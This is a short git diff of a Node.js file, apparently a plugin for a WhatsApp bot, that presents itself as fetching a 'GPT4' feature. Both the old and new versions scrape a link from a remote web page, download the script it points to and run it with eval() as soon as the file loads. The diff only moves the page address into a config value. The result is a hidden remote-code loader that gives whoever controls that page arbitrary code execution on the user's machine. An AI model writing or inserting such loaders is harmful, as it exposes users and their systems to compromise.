@@ -2,27 +2,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchGpt4Url() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const gpt4Url = $(`a:contains("GPT4_URL")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!gpt4Url) throw new Error('GPT4_URL not found on the webpage.');
+    const gpt4UrlElement = $('a:contains("GPT4_URL")');
+    const gpt4Url = gpt4UrlElement.attr('href');
 
-        console.log('GPT4_URL fetched successfully:', gpt4Url);
-
-        const scriptResponse = await axios.get(gpt4Url);
-        const scriptContent = scriptResponse.data;
-        console.log("GPT4_URL script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching GPT4_URL:', error.message);
+    if (!gpt4Url) {
+      throw new Error('GPT4 URL link not found...');
     }
+
+    console.log('GPT4 URL fetched successfully ✅');
+
+    const scriptResponse = await axios.get(gpt4Url);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchGpt4Url();
